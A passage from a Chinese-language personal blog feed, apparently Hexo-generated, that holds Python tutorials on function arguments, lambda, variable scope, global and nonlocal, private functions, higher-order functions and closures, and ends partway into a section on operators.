<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br><span class="line"> </span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">报错如下：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line">改正方式：</span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="三-匿名函数"><a href="#三-匿名函数" class="headerlink" title="三. 匿名函数"></a><font color="#FF6347" face="Comic sans MS">三. 匿名函数</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>python 使用 lambda 来创建匿名函数。</strong></font></p>
<blockquote>
<p><strong>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。</strong></p>
</blockquote>
<ol>
<li>lambda 只是一个表达式，函数体比 def 简单很多。</li>
<li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li>
<li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li>
</ol>
<br>

<p><strong>语法</strong><br>lambda 函数的语法只包含一个语句，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure>

<br>

<p>如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line">sum = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, sum( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, sum( <span class="number">20</span>, <span class="number">20</span> ))</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">相加后的值为 :  <span class="number">30</span></span><br><span class="line">相加后的值为 :  <span class="number">40</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="四-变量作用域"><a href="#四-变量作用域" class="headerlink" title="四. 变量作用域"></a><font color="#FF6347" face="Comic sans MS">四. 变量作用域</font></h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p>
<p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：</p>
<ul>
<li><font color="#FF7F00"><strong>L （Local）</strong></font> 局部作用域</li>
<li><font color="#FF7F00"><strong>E （Enclosing）</strong></font> 闭包函数外的函数中(函数A中定义了函数B，A定义的变量对B来说是闭包函数外的函数)</li>
<li><font color="#FF7F00"><strong>G （Global）</strong></font> 全局作用域</li>
<li><font color="#FF7F00"><strong>B （Built-in）</strong></font> 内置作用域（内置函数所在模块的范围）</li>
</ul>
<p>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内置中找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g_count = <span class="number">0</span>  <span class="comment"># 全局作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    o_count = <span class="number">1</span>  <span class="comment"># 闭包函数外的函数中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        i_count = <span class="number">2</span>  <span class="comment"># 局部作用域</span></span><br></pre></td></tr></table></figure>

<br>

<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    msg = <span class="string">&#x27;I am from Runoob&#x27;</span></span><br><span class="line"></span><br><span class="line">print(msg)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">I am <span class="keyword">from</span> Runoob</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。<br>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问。</p>
</blockquote>
<br>

<br>

<h3 id="五-全局变量和局部变量"><a href="#五-全局变量和局部变量" class="headerlink" title="五. 全局变量和局部变量"></a><font color="#FF6347" face="Comic sans MS">五. 全局变量和局部变量</font></h3><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p>
<p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params"> arg1, arg2 </span>):</span></span><br><span class="line">    <span class="comment">#返回2个参数的和.&quot;</span></span><br><span class="line">    total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;函数内是局部变量 : &quot;</span>, total)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line">sum( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;函数外是全局变量 : &quot;</span>, total)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">函数内是局部变量 :  <span class="number">30</span></span><br><span class="line">函数外是全局变量 :  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>global 和 nonlocal关键字</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>global</strong></font>：内部作用域使用全局变量，并且可以修改，作用影响全局；<br><font color="#FF7F00"><strong>nonlocal</strong></font>：函数A嵌套函数B，函数B使用函数A的变量，并且可以修改，作用影响函数A的这个变量；</p>
</blockquote>
<ol>
<li>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</li>
</ol>
<p>以下实例修改全局变量 num：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="keyword">global</span> num  <span class="comment"># 需要使用 global 关键字声明</span></span><br><span class="line">    print(num) </span><br><span class="line">    num = <span class="number">123</span></span><br><span class="line">    print(num)</span><br><span class="line">fun1()</span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num   <span class="comment"># nonlocal关键字声明</span></span><br><span class="line">        num = <span class="number">100</span></span><br><span class="line">        print(num)</span><br><span class="line">    inner()</span><br><span class="line">    print(num)</span><br><span class="line">outer()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="六-非公开函数"><a href="#六-非公开函数" class="headerlink" title="六. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">六. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p>类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；</p>
<p>之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p>我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：</p>
<p>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数式编程</title>
    <url>/post/Python-FunctionalProgramming/</url>
    <content><![CDATA[<p>装饰器还没搞懂，搞懂了再来继续写吧~<br>函数既可作为返回值也可作为函数的参数…一切都是对象，一切都是指针，一切都是东西…<br>返回函数（引用）和返回函数值是不一样滴….  ◡̈⃝︎⋆︎* </p>
<a id="more"></a>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数式编程</font> </center>


<br>

<br>

<br>

<center><font face="Comic sans MS">**函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！**</font> </center>


<br>

<br>

<h3 id="一-高阶函数"><a href="#一-高阶函数" class="headerlink" title="一. 高阶函数"></a><font color="#FF6347" face="Comic sans MS">一. 高阶函数</font></h3><br>

<blockquote>
<ol>
<li><font color="#FF7F00"><strong>变量可以指向函数</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数名也是变量</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为return的返回值</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为另一个函数的参数</strong></font>。</li>
</ol>
</blockquote>
<br>

<h4 id="1-1-变量指向函数"><a href="#1-1-变量指向函数" class="headerlink" title="1.1 变量指向函数"></a><font color="#3CB371" face="Comic sans MS">1.1 变量指向函数</font></h4><br>

<p>&emsp;&emsp; <font face="Microsoft YaHei">在讲变量和字符串的时候我们讲过，变量就是一个对象，可以当作一个指针使用，而函数名也是一个变量，也就是一个对象。函数名其实就是指向函数的变量！注意，函数名是一个变量！变量！变量！当作指针用。</font></p>
<p>&emsp;&emsp; <font face="Sans-serif">既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。<br></font></p>
<br>

<hr>
<hr>
<p><font color="red" face="Comic sans MS"><strong>见过两种函数赋值给变量的形式</strong></font><font face="Comic sans MS">，这两种形式是有区别的，分别总结一下。</font><br>一种是</p>
<p><strong><code>    a = f</code></strong></p>
<p>另一种是</p>
<p><strong><code>    a = f()</code></strong></p>
<p><font color="red"><strong>1.</strong> <strong><code>a = f</code></strong> <strong>型属于将变量指向函数。</strong></font></p>
<p>如下用示例说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(abs(<span class="number">-10</span>))</span><br><span class="line">print(abs)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function abs&gt;</span><br><span class="line">------------------------------------------------------------------------------------------  </span><br><span class="line">可见，abs(<span class="number">-10</span>)是函数调用，而abs是函数本身。</span><br><span class="line">要获得函数调用结果，我们可以把结果赋值给变量：  </span><br><span class="line"></span><br><span class="line">x = abs(<span class="number">-10</span>)</span><br><span class="line">print(x)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是，如果把函数本身赋值给变量呢？</span><br><span class="line"></span><br><span class="line">f = abs</span><br><span class="line">print(f)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">&lt;built-<span class="keyword">in</span> function abs&gt;</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">结论：函数本身也可以赋值给变量，即：变量可以指向函数。</span><br><span class="line">如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：</span><br><span class="line"></span><br><span class="line">f = abs</span><br><span class="line">print(f(<span class="number">-10</span>))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">成功！说明变量f现在已经指向了abs函数本身。直接调用abs()函数和调用变量f()完全相同。</span><br></pre></td></tr></table></figure>

<br>

<p>说明变量f现在已经指向了abs函数本身。直接调用<code>abs()</code>函数和调用变量<code>f()</code>完全相同。这是廖雪峰老师python教程上的例子，现在调用<code>f()</code>和调用<code>abs()</code>是一样的了。</p>
<br>

<p>再举一个工厂函数的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line"> </span><br><span class="line">　　<span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">X</span>):</span></span><br><span class="line"> </span><br><span class="line">　　　　<span class="keyword">return</span> X**N</span><br><span class="line"> </span><br><span class="line">　　<span class="keyword">return</span> action</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这个嵌套函数的外层返回值为内层函数的函数名，注意没有括号，这里有无括号是有很大区别的。此时调用外部函数：</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)   //此时进入maker(<span class="number">2</span>)，且定义了一个action(X)函数，然后返回action函数名（对象）给f</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">那么如上所述，f便指向了action函数，且限制条件为N=<span class="number">2</span>，可以理解为f为N等于<span class="number">2</span>时的action函数。我们来调用它：</span><br><span class="line"></span><br><span class="line">print(f(<span class="number">3</span>))   //此时相当于调用了cation(<span class="number">3</span>)函数，这也是在外部使用内部嵌套函数的方法，</span><br><span class="line">              //因为内部嵌套函数是不允许在外部访问的。</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">9</span>            //证明f和action函数是一样的。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">如上的示例也可以用print(f=maker(<span class="number">2</span>)(<span class="number">3</span>))来输出结果一样，两个括号连在一起相当于执行了这两个函数。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">c</span>):</span> </span><br><span class="line">		<span class="keyword">return</span> c**N </span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)(<span class="number">3</span>)</span><br><span class="line">print(f)</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">9</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="red"><strong>2.</strong> <strong><code>a = f()</code></strong> <strong>型属于将f()的返回值赋值给a的过程</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">这里的a仅仅接收f()的返回值，如果f()没有返回值，那么a即被赋值为<span class="literal">None</span>。这里值得注意的一点是，</span><br><span class="line">在a=f()的执行过程中，f()会运行一次，如：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">	z = x+y</span><br><span class="line">	print(z)</span><br><span class="line">a = add(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">print(<span class="string">&#x27;******我是分隔符，嘿嘿嘿******&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">OUTPUT: </span><br><span class="line"><span class="number">7</span></span><br><span class="line">******我是分隔符，嘿嘿嘿******</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这里在分隔符前输出了<span class="number">7</span>，说明赋值过程函数add执行了，然而a的值为<span class="literal">None</span>，且只能通过<span class="keyword">print</span>语句才可以显示。</span><br><span class="line">这是因为add()函数没有<span class="keyword">return</span>语句。</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-传入函数与返回函数名"><a href="#1-2-传入函数与返回函数名" class="headerlink" title="1.2 传入函数与返回函数名"></a><font color="#3CB371" face="Comic sans MS">1.2 传入函数与返回函数名</font></h4><br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、传入函数（把函数作为参数）</strong></font></p>
<p>&emsp;&emsp;既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。</p>
<p>一个最简单的高阶函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def add(x, y, f):</span><br><span class="line">    return f(x) + f(y)</span><br></pre></td></tr></table></figure>

<p>当我们调用<code>add(-5, 6, abs)</code>时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">-5</span></span><br><span class="line">y = <span class="number">6</span></span><br><span class="line">f = abs</span><br><span class="line">f(x) + f(y) ==&gt; abs(-5) + abs(6) ==&gt; 11</span><br><span class="line"><span class="keyword">return</span> <span class="number">11</span></span><br></pre></td></tr></table></figure>


<p>用代码验证一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y, f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(x) + f(y)</span><br><span class="line"></span><br><span class="line">print(add(<span class="number">-5</span>, <span class="number">6</span>, abs))</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">11</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><strong>总结：</strong>编写高阶函数，就是让函数的参数能够接收别的函数。<font color="#FF7F00"><strong>把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式</strong></font>。</p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、返回函数名（把函数名作为返回值）</strong></font></p>
<p>&emsp;&emsp;高阶函数除了可以接受函数作为参数外，还可以把函数名作为结果值返回。注意Python3<font color="#FF7F00"><strong>返回的是迭代器对象</strong></font>。</p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_sum</span>(<span class="params">*args</span>):</span>   <span class="string">&#x27;在函数的参数章节讲过，*传入元组，**传入字典&#x27;</span></span><br><span class="line">    ax = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        ax = ax + n</span><br><span class="line">    <span class="keyword">return</span> ax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，</span></span><br><span class="line"><span class="string">而是返回求和的函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazy_sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sum</span>():</span></span><br><span class="line">        ax = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">            ax = ax + n</span><br><span class="line">        <span class="keyword">return</span> ax</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">print(f)</span><br><span class="line">OUTPUT: &lt;function lazy_sum.&lt;locals&gt;.sum at <span class="number">0x101c6ed90</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;调用函数f时，才真正计算求和的结果：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f()</span><br><span class="line">OUTPUT: <span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum</span></span><br><span class="line"><span class="string">的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为</span></span><br><span class="line"><span class="string">“闭包（Closure）”的程序结构拥有极大的威力。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f1 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f2 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f1==f2</span><br><span class="line">OUTPUT: <span class="literal">False</span></span><br><span class="line"><span class="string">&#x27;f1()和f2()的调用结果互不影响。&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、闭包</strong></font></p>
<p>&emsp;&emsp;注意到返回的函数在其定义内部引用了局部变量<code>args</code>，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。</span></span><br><span class="line"><span class="string">	我们来看一个例子：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">             <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append(f)</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。</span></span><br><span class="line"><span class="string">你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变</span></span><br><span class="line"><span class="string">量i已经变成了3，因此最终结果为9。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</span></span><br><span class="line"><span class="string">如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该</span></span><br><span class="line"><span class="string">循环变量后续如何更改，已绑定到函数参数的值不变：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">j</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">            <span class="keyword">return</span> j*j</span><br><span class="line">        <span class="keyword">return</span> g</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        fs.append(f(i)) <span class="comment"># f(i)立刻被执行，因此i的当前值被传入f()</span></span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;再看看结果：&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1, f2, f3 = count()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;缺点是代码较长，可利用lambda函数缩短代码。&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-装饰器"><a href="#二-装饰器" class="headerlink" title="二. 装饰器"></a><font color="#FF6347" face="Comic sans MS">二. 装饰器</font></h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-运算符</title>
    <url>/post/Python-Operators/</url>
    <content><![CDATA[<p>要常来骚扰…₍ ..̮ ₎ ₍ ..̮ ₎ </p>
<a id="more"></a>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>运算符</font> </center>

<br>

<br>

<p>Python语言支持以下类型的运算符:</p>
<ul>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf1">算术运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf2">比较（关系）运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf3">赋值运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf4">逻辑运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf5">位运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf6">成员运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf7">身份运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf8">运算符优先级</a></font></p>
</li>
</ul>
<br>

<br>

<h3 id="一-算术运算符"><a href="#一-算术运算符" class="headerlink" title=" 一. 算术运算符"></a><font color="#FF6347" face="Comic sans MS"> 一. 算术运算符</font></h3><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
</table>
<ul>
<li>|加 - 两个对象相加                                |a + b 输出结果 30</li>
</ul>
<ul>
<li>|减 - 得到负数或是一个数减去另一个数                |a - b 输出结果 -10</li>
</ul>
<ul>
<li>|乘 - 两个数相乘或是返回一个被重复若干次的字符串    |a * b 输出结果 200<br>/    |除 - x除以y                                        |b / a 输出结果 2<br>%    |取模 - 返回除法的余数                            |b % a 输出结果 0</li>
<li><ul>
